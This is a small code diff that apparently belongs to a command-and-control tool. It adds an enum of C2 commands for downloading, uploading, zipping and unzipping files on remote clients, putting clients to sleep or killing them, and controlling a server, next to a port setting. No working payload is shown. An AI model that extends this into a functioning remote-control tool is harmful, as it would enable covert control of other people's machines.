@@ -13,6 +13,19 @@ class HTTPStatusCode(Enum):
     NOT_FOUND = 404
     INTERNAL_SERVER_ERROR = 500
 
+class C2Commands(Enum):
+    CLS = "client"
+    CLS_DWN = "client download"
+    CLS_UP = "client upload"
+    CLS_ZIP = "client zip"
+    CLS_UZIP = "client unzip"
+    CLS_SLP = "client sleep "
+    CLS_KLL = "client kill"
+    SERV = "server"
+    SERV_CTRL = "server control "
+    SERV_SH_CLS = "server show clients"
+    CD = "cd "
+
 PORT = 8900
 
 
